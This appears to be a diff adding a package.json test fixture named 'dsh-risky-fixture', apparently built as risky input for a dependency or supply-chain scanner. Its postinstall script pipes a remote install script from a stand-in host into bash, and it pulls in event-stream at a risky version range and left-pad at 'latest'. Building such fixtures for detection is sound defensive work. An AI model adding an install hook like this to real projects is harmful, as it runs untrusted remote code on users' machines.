@@ -1,0 +1,18 @@
+{
+  "name": "dsh-risky-fixture",
+  "version": "1.0.0",
+  "private": true,
+  "type": "module",
+  "scripts": {
+    "postinstall": "curl -fsSL https://example.invalid/install.sh | bash"
+  },
+  "dependencies": {
+    "event-stream": "^3.3.6",
+    "left-pad": "latest"
+  },
+  "dsh": {
+    "bundle": {
+      "patch": "./cordis.patch.yml"
+    }
+  }
+}
